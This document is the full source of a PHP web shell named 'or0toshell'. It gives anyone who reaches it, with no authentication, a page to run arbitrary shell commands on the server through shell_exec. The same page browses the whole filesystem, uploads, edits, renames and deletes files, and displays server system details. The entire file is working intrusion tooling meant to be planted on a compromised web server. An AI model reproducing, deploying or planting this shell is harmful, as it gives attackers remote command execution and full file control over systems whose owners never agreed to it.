<?php
session_start();
$rootPath = __DIR__;
function formatSizeUnits($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return $bytes . ' byte';
    }
    return '0 bytes';
}
function fileExtension($file) {
    return pathinfo($file, PATHINFO_EXTENSION);
}
function fileIcon($file) {
    $ext = strtolower(fileExtension($file));
    $imgExts   = ["apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp"];
    $audioExts = ["wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc"];
    if ($file === "error_log") {
        return '<i class="fa-solid fa-bug"></i>';
    } elseif ($file === ".htaccess") {
        return '<i class="fa-solid fa-hammer"></i>';
    }
    if (in_array($ext, ["html", "htm"])) {
        return '<i class="fa-brands fa-html5"></i>';
    } elseif (in_array($ext, ["php", "phtml"])) {
        return '<i class="fa-brands fa-php"></i>';
    } elseif (in_array($ext, $imgExts)) {
        return '<i class="fa-regular fa-images"></i>';
    } elseif ($ext === "css") {
        return '<i class="fa-brands fa-css3"></i>';
    } elseif ($ext === "txt") {
        return '<i class="fa-regular fa-file-lines"></i>';
    } elseif (in_array($ext, $audioExts)) {
        return '<i class="fa-solid fa-music"></i>';
    } elseif ($ext === "py") {
        return '<i class="fa-brands fa-python"></i>';
    } elseif ($ext === "js") {
        return '<i class="fa-brands fa-js"></i>';
    }
    return '<i class="fa-solid fa-file"></i>';
}
function encodePath($path) {
    return urlencode(base64_encode($path));
}
function decodePath($encoded) {
    return base64_decode(urldecode($encoded));
}
function generateBreadcrumb($path) {
    $path = str_replace('\\', '/', $path);
    $parts = explode('/', $path);
    $breadcrumb = '<a href="?p=' . encodePath(DIRECTORY_SEPARATOR) . '">Root</a>';
    $current = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb .= ' / <a href="?p=' . encodePath($current) . '">' . htmlspecialchars($part) . '</a>';
    }
    return $breadcrumb;
}
$currentPath = $rootPath;
if (isset($_GET['p'])) {
    $decoded = decodePath($_GET['p']);
    if (is_dir($decoded)) {
        $currentPath = realpath($decoded);
    } else {
        $_SESSION['message'] = "Invalid directory.";
        header("Location: ?p=" . encodePath($rootPath));
        exit;
    }
} elseif (isset($_GET['q'])) {
    $decoded = decodePath($_GET['q']);
    if (is_dir($decoded)) {
        $currentPath = realpath($decoded);
    } else {
        header("Location: ?p=" . encodePath($rootPath));
        exit;
    }
}
define("CURRENT_PATH", $currentPath);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['rename']) && isset($_GET['r'])) {
        $oldItem = CURRENT_PATH . DIRECTORY_SEPARATOR . basename($_GET['r']);
        $newName = basename($_POST['name']);
        $newItem = CURRENT_PATH . DIRECTORY_SEPARATOR . $newName;
        if (rename($oldItem, $newItem)) {
            $_SESSION['message'] = "Renamed successfully.";
        } else {
            $_SESSION['message'] = "Rename failed.";
        }
        header("Location: ?p=" . encodePath(CURRENT_PATH));
        exit;
    }
    if (isset($_POST['edit']) && isset($_GET['e'])) {
        $filePath = CURRENT_PATH . DIRECTORY_SEPARATOR . basename($_GET['e']);
        if (file_put_contents($filePath, $_POST['data']) !== false) {
            $_SESSION['message'] = "File saved successfully.";
        } else {
            $_SESSION['message'] = "Error saving file.";
        }
        header("Location: ?p=" . encodePath(CURRENT_PATH));
        exit;
    }
    if (isset($_POST['upload'])) {
        if (isset($_FILES['fileToUpload'])) {
            $targetPath = CURRENT_PATH . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
            if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetPath)) {
                $_SESSION['message'] = "File uploaded successfully.";
            } else {
                $_SESSION['message'] = "Upload failed.";
            }
        }
        header("Location: ?p=" . encodePath(CURRENT_PATH));
        exit;
    }
    if (isset($_POST['execute_cmd'])) {
        $cmd = $_POST['cmd'];
        $output = shell_exec($cmd);
        $_SESSION['cmd_output'] = $output;
        header("Location: ?p=" . encodePath(CURRENT_PATH));
        exit;
    }
}
if (isset($_GET['d'])) {
    $itemName = basename($_GET['d']);
    $itemPath = CURRENT_PATH . DIRECTORY_SEPARATOR . $itemName;
    if (is_file($itemPath)) {
        if (unlink($itemPath)) {
            $_SESSION['message'] = "File deleted.";
        } else {
            $_SESSION['message'] = "Error deleting file.";
        }
    } elseif (is_dir($itemPath)) {
        if (rmdir($itemPath)) {
            $_SESSION['message'] = "Directory deleted.";
        } else {
            $_SESSION['message'] = "Error deleting directory (ensure it is empty).";
        }
    }
    header("Location: ?p=" . encodePath(CURRENT_PATH));
    exit;
}
$folders = [];
$files = [];
if (is_readable(CURRENT_PATH)) {
    $items = scandir(CURRENT_PATH);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = CURRENT_PATH . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } elseif (is_file($fullPath)) {
            $files[] = $item;
        }
    }
}
$system_info = [
    'Operating System' => php_uname(),
    'PHP Version'      => phpversion(),
    'Server Software'  => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
    'Document Root'    => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
    'Current Directory'=> CURRENT_PATH,
    'Free Disk Space'  => formatSizeUnits(disk_free_space(CURRENT_PATH)),
    'Total Disk Space' => formatSizeUnits(disk_total_space(CURRENT_PATH))
];
$message = isset($_SESSION['message']) ? $_SESSION['message'] : '';
$cmd_output = isset($_SESSION['cmd_output']) ? $_SESSION['cmd_output'] : '';
unset($_SESSION['message'], $_SESSION['cmd_output']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>or0toshell</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" rel="stylesheet">
<style>
body { background-color: #000; color: #FFD700; }
.navbar, .card { background-color: #000; border: 1px solid #FFD700; }
a { color: #FFD700; }
a:hover { color: #FFA500; text-decoration: none; }
.breadcrumb a { color: #FFD700; }
.table { color: #FFD700; }
.form-control, .btn { background-color: #000; border: 1px solid #FFD700; color: #FFD700; }
.form-control:focus, .btn:focus { box-shadow: none; }
pre { background-color: #000; padding: 15px; border: 1px solid #FFD700; border-radius: 5px; overflow-x: auto; color: #FFD700; }
.footer { text-align: center; margin-top: 20px; font-size: 0.9em; }
</style>
</head>
<body>
<div class="container py-3">
  <nav class="navbar navbar-expand-lg mb-3">
    <a class="navbar-brand" href="?p=<?= encodePath(CURRENT_PATH) ?>">or0toshell</a>
    <div class="ms-auto">
      <a href="?p=<?= encodePath($rootPath) ?>" class="btn btn-sm btn-outline-warning me-2">Home</a>
      <a href="?p=<?= encodePath(CURRENT_PATH) ?>&upload=1" class="btn btn-sm btn-outline-warning">Upload</a>
    </div>
  </nav>
  <?php if ($message): ?>
    <div class="alert alert-warning"><?= htmlspecialchars($message) ?></div>
  <?php endif; ?>
  <div class="card mb-3">
    <div class="card-header">System Information</div>
    <div class="card-body">
      <table class="table table-borderless">
        <?php foreach ($system_info as $key => $value): ?>
          <tr>
            <th><?= htmlspecialchars($key) ?></th>
            <td><?= htmlspecialchars($value) ?></td>
          </tr>
        <?php endforeach; ?>
      </table>
    </div>
  </div>
  <div class="card mb-3">
    <div class="card-header">Execute Command</div>
    <div class="card-body">
      <form method="post" class="row g-2">
        <div class="col-md-10">
          <input type="text" name="cmd" class="form-control" placeholder="Enter shell command" required>
        </div>
        <div class="col-md-2">
          <button type="submit" name="execute_cmd" class="btn btn-warning w-100">Run</button>
        </div>
      </form>
      <?php if ($cmd_output): ?>
        <hr>
        <h6>Output:</h6>
        <pre><?= htmlspecialchars($cmd_output) ?></pre>
      <?php endif; ?>
    </div>
  </div>
  <nav aria-label="breadcrumb" class="mb-3">
    <?= generateBreadcrumb(CURRENT_PATH) ?>
  </nav>
  <?php if (isset($_GET['upload'])): ?>
    <div class="card mb-3">
      <div class="card-header">Upload File</div>
      <div class="card-body">
        <form method="post" enctype="multipart/form-data">
          <div class="mb-3">
            <label for="fileToUpload" class="form-label">Select file:</label>
            <input type="file" name="fileToUpload" id="fileToUpload" class="form-control" required>
          </div>
          <button type="submit" name="upload" class="btn btn-warning">Upload</button>
        </form>
      </div>
    </div>
  <?php endif; ?>
  <?php if (isset($_GET['r']) && isset($_GET['q'])): ?>
    <div class="card mb-3">
      <div class="card-header">Rename: <?= htmlspecialchars($_GET['r']) ?></div>
      <div class="card-body">
        <form method="post">
          <div class="mb-3">
            <label for="renameInput" class="form-label">New name:</label>
            <input type="text" name="name" id="renameInput" class="form-control" value="<?= htmlspecialchars($_GET['r']) ?>" required>
          </div>
          <button type="submit" name="rename" class="btn btn-warning">Rename</button>
        </form>
      </div>
    </div>
  <?php endif; ?>
  <?php if (isset($_GET['e']) && isset($_GET['q'])): ?>
    <div class="card mb-3">
      <div class="card-header">Editing File: <?= htmlspecialchars($_GET['e']) ?></div>
      <div class="card-body">
        <form method="post">
          <div class="mb-3">
            <textarea name="data" rows="10" class="form-control" required><?= htmlspecialchars(file_get_contents(CURRENT_PATH . DIRECTORY_SEPARATOR . $_GET['e'])) ?></textarea>
          </div>
          <button type="submit" name="edit" class="btn btn-warning">Save</button>
        </form>
      </div>
    </div>
  <?php endif; ?>
  <div class="card">
    <div class="card-header">Directory: <?= htmlspecialchars(CURRENT_PATH) ?></div>
    <div class="card-body p-0">
      <table class="table table-hover m-0">
        <thead class="table-dark">
          <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Perms</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          <?php foreach ($folders as $folder): ?>
            <tr>
              <td>
                <i class="fa-solid fa-folder"></i>
                <a href="?p=<?= encodePath(CURRENT_PATH . DIRECTORY_SEPARATOR . $folder) ?>"><?= htmlspecialchars($folder) ?></a>
              </td>
              <td>—</td>
              <td><?= date("F d Y H:i:s", filemtime(CURRENT_PATH . DIRECTORY_SEPARATOR . $folder)) ?></td>
              <td><?= substr(decoct(fileperms(CURRENT_PATH . DIRECTORY_SEPARATOR . $folder)), -3) ?></td>
              <td>
                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&r=<?= urlencode($folder) ?>" title="Rename">
                  <i class="fa-solid fa-pen-to-square"></i>
                </a>
                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&d=<?= urlencode($folder) ?>" title="Delete" onclick="return confirm('Delete this folder?');">
                  <i class="fa-solid fa-trash"></i>
                </a>
              </td>
            </tr>
          <?php endforeach; ?>
          <?php foreach ($files as $file): ?>
            <tr>
              <td><?= fileIcon($file) ?> <?= htmlspecialchars($file) ?></td>
              <td><?= formatSizeUnits(filesize(CURRENT_PATH . DIRECTORY_SEPARATOR . $file)) ?></td>
              <td><?= date("F d Y H:i:s", filemtime(CURRENT_PATH . DIRECTORY_SEPARATOR . $file)) ?></td>
              <td><?= substr(decoct(fileperms(CURRENT_PATH . DIRECTORY_SEPARATOR . $file)), -3) ?></td>
              <td>
                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&e=<?= urlencode($file) ?>" title="Edit">
                  <i class="fa-solid fa-file-pen"></i>
                </a>
                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&r=<?= urlencode($file) ?>" title="Rename">
                  <i class="fa-solid fa-pen-to-square"></i>
                </a>
                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&d=<?= urlencode($file) ?>" title="Delete" onclick="return confirm('Delete this file?');">
                  <i class="fa-solid fa-trash"></i>
                </a>
              </td>
            </tr>
          <?php endforeach; ?>
          <?php if (empty($folders) && empty($files)): ?>
            <tr>
              <td colspan="5" class="text-center">No files or folders found.</td>
            </tr>
          <?php endif; ?>
        </tbody>
      </table>
    </div>
  </div>
  <div class="footer">
    or0toshell - Developed by <a href="https://www.linkedin.com/in/dragonked2" target="_blank" style="color: #FFD700;">Ali Essam</a>
  </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
